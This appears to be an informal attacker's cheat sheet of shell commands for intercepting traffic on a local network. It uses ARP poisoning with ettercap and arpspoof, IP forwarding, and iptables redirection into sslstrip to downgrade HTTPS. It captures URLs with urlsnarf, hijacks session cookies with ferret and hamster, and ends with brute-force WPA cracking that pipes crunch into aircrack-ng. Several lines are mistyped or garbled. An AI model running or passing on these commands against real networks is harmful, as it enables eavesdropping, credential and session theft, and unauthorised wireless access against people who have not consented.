```bash
ttercap -T -Q -M arp:remote -i wlan0 /victim IP/ /gateway_IP/ -P remote_browser
echo "1" > /proc/sys/net/ipv4/ip_forward

# the -T starts it in text mode.
# the  -Q will make ettercap be superQuiet (not print raw packets in the terminal window)
# the  -M starts man in the middle mode, and the arp:remote is the type of poisoning, and remote is a parameter for MITM.  these commands can be # combined into one switch like -TQM  but for clarity i put them separately.
# NOTE: the victim IP must be in the same subnet as your PC.

# p
# then
# gw_discover
# to give you the gateway in ettercap

# to scan IPs on the network 
nmap -sP 10.10.10.*

arpspoof -i wlan0 -t target_IP GATEWAY_IP

sniff ssl

configure /etc/etter.conf
privs 0 0

redir_command_on/off
under linux
redir_command_on un commented with off
ip_forward 1

arpspoof -i wlan0 -t target_IP GATEWAY_IP
# If you want to poison multiple targets just leave the “-t” out of the arpspoof command  and leave the gateway

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
urlsnarf -i wlan0|cut -d\" -f4

sslstrip -a -k -f
ettercap -T -q -i wlan0

reset iptables
iptables –flush/ iptables -F

./ferret -i eth0  
./hamster  

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.104 192.168.1.1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sslstrip -p -k -f

/pentest/sniffers/hamster/ferret -i eth0

/pentest/sniffers/hamster/hamster

# Konqueror -> Settings -> Configure Konqueror -> Proxy -> Manually. 127.0.0.1:1234
# Konqueror -> http://hamster

# root@bt:/pentest/web/sslstrip# python sslstrip -a -k


# WPA without dictionary
# / pentest / passwords / crunch /. / crunch 9 9 | aircrack-ng -b (BSSID) -w - / root/.gerix-wifi-cracker/sniff_dump- *. cap
# / pentest / passwords / crunch /. / Crunch 9 9 KIULO56UH | aircrack-ng-b (BSSID)-w - / root/.gerix-wifi-cracker/sniff_dump- *. cap
```

